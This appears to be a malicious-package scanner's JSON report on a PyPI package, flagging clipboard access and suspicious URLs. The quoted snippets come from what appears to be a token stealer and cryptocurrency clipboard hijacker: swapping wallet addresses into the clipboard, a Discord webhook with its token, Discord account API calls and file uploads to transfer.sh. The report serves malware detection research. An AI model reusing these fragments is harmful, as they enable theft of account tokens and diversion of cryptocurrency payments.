@@ -1,0 +1,150 @@
+{
+    "issues": 26,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": [
+            {
+                "location": "methantiafk/__init__.py:342",
+                "code": "            clipboard_data = pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:346",
+                "code": "                        pyperclip.copy(self.address_btc)\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:347",
+                "code": "                        pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:350",
+                "code": "                pyperclip.copy(self.address_eth)\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:351",
+                "code": "                pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:356",
+                "code": "                        pyperclip.copy(self.address_xchain)\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:357",
+                "code": "                        pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:363",
+                "code": "                        pyperclip.copy(self.address_pchain)\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:364",
+                "code": "                        pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:370",
+                "code": "                        pyperclip.copy(self.address_cchain)\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:371",
+                "code": "                        pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:376",
+                "code": "                        pyperclip.copy(self.address_ada)\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:377",
+                "code": "                        pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:382",
+                "code": "                        pyperclip.copy(self.address_dash)\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:383",
+                "code": "                        pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:388",
+                "code": "                        pyperclip.copy(self.address_monero)\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            },
+            {
+                "location": "methantiafk/__init__.py:389",
+                "code": "                        pyperclip.paste()\n",
+                "message": "This package accesses the clipboard, which can indicate it's trying to steal sensitive data or overwrite cryptocurrency addresses"
+            }
+        ],
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "methantiafk/__init__.py:52",
+                "code": "webhook_url = \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "methantiafk/__init__.py:145",
+                "code": "    'yourwebhookurl': \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\",\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "methantiafk/__init__.py:208",
+                "code": "BlackCap_Regex = 'https://pastebin.com/raw/f4PM9Dse'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "methantiafk/__init__.py:302",
+                "code": "        req = httpx.get(\"https://ipinfo.io/json\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "methantiafk/__init__.py:409",
+                "code": "        self.dscap1 = \"https://discord.com/api/v9/users/@me\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "methantiafk/__init__.py:419",
+                "code": "        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "methantiafk/__init__.py:445",
+                "code": "        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "methantiafk/__init__.py:1756",
+                "code": "        upload = requests.post(\"https://transfer.sh/\", files=files)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "methantiafk/__init__.py:1841",
+                "code": "    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.co...lix.com)'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/methantiafk-0.0.3"
+}
